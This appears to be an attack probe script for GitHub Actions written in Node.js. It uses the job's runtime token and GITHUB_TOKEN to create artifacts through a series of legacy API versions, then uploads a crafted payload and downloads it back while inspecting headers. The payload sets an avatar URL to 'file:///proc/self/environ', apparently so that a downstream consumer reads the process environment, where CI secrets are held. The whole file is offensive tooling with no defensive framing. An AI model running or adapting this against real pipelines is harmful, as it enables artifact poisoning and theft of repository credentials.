import http from 'node:http';
import https from 'node:https';

const runtimeUrl = process.env.ACTIONS_RUNTIME_URL;
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || '';
const runId = process.env.GITHUB_RUN_ID;
const repo = process.env.GITHUB_REPOSITORY;
const token = process.env.GITHUB_TOKEN;
const body = Buffer.from(JSON.stringify({
  full_name: `${repo}/legacy3`,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'legacy3', stargazers_count: 0,
}));

function req(url, method = 'GET', payload = null, headers = {}) {
  return new Promise((resolve, reject) => {
    const t = new URL(url);
    const mod = t.protocol === 'https:' ? https : http;
    const r = mod.request(t, {method, headers, timeout: 25000}, (res) => {
      const c = [];
      res.on('data', (x) => c.push(x));
      res.on('end', () => resolve({status: res.statusCode, headers: res.headers, rawHeaders: res.rawHeaders, body: Buffer.concat(c)}));
    });
    r.on('error', reject);
    r.on('timeout', () => r.destroy(new Error('timeout')));
    if (payload) r.write(payload);
    r.end();
  });
}
function ctHex(r) {
  for (let i = 0; i < r.rawHeaders.length; i += 2) {
    if (String(r.rawHeaders[i]).toLowerCase() === 'content-type') return Buffer.from(r.rawHeaders[i + 1], 'latin1').toString('hex');
  }
  return null;
}

const base = runtimeUrl.replace(/\/$/, '');
const out = {baseOrigin: new URL(base).origin, tries: []};
const versions = ['6.0-preview', '6.0-preview.1', '5.1-preview', '5.1-preview.1', '5.0-preview', '4.1-preview', '4.0-preview', '3.0-preview', '2.0', '1.0'];
let created = null;
for (const v of versions) {
  const url = `${base}/_apis/pipelines/workflows/${runId}/artifacts?api-version=${v}`;
  try {
    const payload = JSON.stringify({Type: 'actions_storage', Name: `legacy3-${v.replace(/\./g, '-')}-${runId}`});
    const r = await req(url, 'POST', Buffer.from(payload), {
      Authorization: `Bearer ${runtimeToken}`,
      Accept: `application/json;api-version=${v}`,
      'Content-Type': 'application/json',
      'Content-Length': String(Buffer.byteLength(payload)),
      'User-Agent': 'legacy3',
    });
    const rec = {version: v, status: r.status, body: r.body.toString('utf8').slice(0, 220)};
    out.tries.push(rec);
    if (r.status === 200) { created = {version: v, json: JSON.parse(r.body.toString('utf8'))}; break; }
  } catch (e) {
    out.tries.push({version: v, err: String(e).slice(0, 150)});
  }
}
out.created = created;
if (created) {
  const fc = created.json.fileContainerResourceUrl;
  out.fileContainer = fc;
  const itemPath = `${created.json.name}/payload.json`;
  const upUrl = new URL(fc);
  upUrl.searchParams.append('itemPath', itemPath);
  const up = await req(upUrl.href, 'PUT', body, {
    Authorization: `Bearer ${runtimeToken}`,
    Accept: `application/json;api-version=${created.version}`,
    'Content-Type': 'application/octet-stream',
    'Content-Range': `bytes 0-${body.length - 1}/${body.length}`,
    'Content-Length': String(body.length),
    'User-Agent': 'legacy3',
  });
  out.upload = {status: up.status, body: up.body.toString('utf8').slice(0, 200)};
  const listUrl = new URL(fc);
  listUrl.searchParams.append('itemPath', created.json.name);
  const list = await req(listUrl.href, 'GET', null, {
    Authorization: `Bearer ${runtimeToken}`,
    Accept: `application/json;api-version=${created.version}`,
    'User-Agent': 'legacy3',
  });
  out.list = {status: list.status, body: list.body.toString('utf8').slice(0, 900)};
  // public REST artifacts list and download
  try {
    const r = await req(`https://api.github.com/repos/${repo}/actions/runs/${runId}/artifacts?per_page=100`, 'GET', null, {
      Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'legacy3',
    });
    const j = JSON.parse(r.body.toString('utf8'));
    const arts = (j.artifacts || []).filter((a) => a.name && a.name.startsWith('legacy3-'));
    out.public = arts.map((a) => ({id: a.id, name: a.name, size: a.size_in_bytes}));
    if (arts.length) {
      const aid = arts[0].id;
      const d = await req(`https://api.github.com/repos/${repo}/actions/artifacts/${aid}/zip`, 'GET', null, {
        Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'legacy3',
      });
      out.downloadRest = {status: d.status, loc: (d.headers.location || '').slice(0, 250)};
      if (d.headers.location) {
        const f = await req(d.headers.location, 'GET', null, {'User-Agent': 'legacy3'});
        out.downloadFinal = {status: f.status, ctHex: ctHex(f), bodyMatch: f.body.equals(body)};
      }
    }
  } catch (e) { out.publicErr = String(e).slice(0, 200); }
}
console.log('LEGACY3', JSON.stringify(out));
